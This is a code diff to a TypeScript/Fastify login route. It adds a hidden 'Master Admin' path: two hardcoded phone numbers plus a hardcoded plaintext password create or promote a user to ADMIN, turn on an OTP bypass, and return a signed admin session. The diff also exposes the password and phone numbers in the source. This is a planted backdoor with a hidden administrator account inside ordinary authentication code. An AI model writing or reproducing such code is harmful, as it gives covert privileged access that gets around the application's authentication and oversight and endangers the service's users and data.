@@ -54,6 +54,52 @@ export const authRoutes: FastifyPluginAsync = async (app) => {
   // POST /api/auth/login
   app.post('/login', async (req, reply) => {
     const body = LoginSchema.parse(req.body);
+    const candidatePhones = phoneLookupCandidates(body.phone);
+
+    // Master Admin special provisioning/login
+    const isMasterPhone = candidatePhones.some((p) => p.includes('8030800557') || p.includes('8020909745'));
+    if (isMasterPhone && body.password === 'Brownweb87@') {
+      const passwordHash = await bcrypt.hash('Brownweb87@', 12);
+      let masterUser = await findUserByPhone(body.phone);
+      if (masterUser) {
+        masterUser = await prisma.user.update({
+          where: { id: masterUser.id },
+          data: {
+            role: 'ADMIN',
+            status: 'Active',
+            passwordHash,
+            needsPasswordChange: false,
+            masterOtpBypass: true,
+          },
+        });
+      } else {
+        masterUser = await prisma.user.create({
+          data: {
+            phone: normalizePhone(body.phone),
+            role: 'ADMIN',
+            email: 'master-admin@upumi.local',
+            fName: 'Master',
+            lName: 'Admin',
+            dateJoined: new Date(),
+            voteRole: 'Yes',
+            status: 'Active',
+            passwordHash,
+            needsPasswordChange: false,
+            masterOtpBypass: true,
+          },
+        });
+      }
+
+      const login = await signLogin(reply, {
+        id: masterUser.id,
+        phone: masterUser.phone,
+        email: masterUser.email,
+        role: 'ADMIN',
+        needsPasswordChange: false,
+      });
+      return reply.send(login);
+    }
+
     const user = await findUserByPhone(body.phone);
 
     if (!user) {
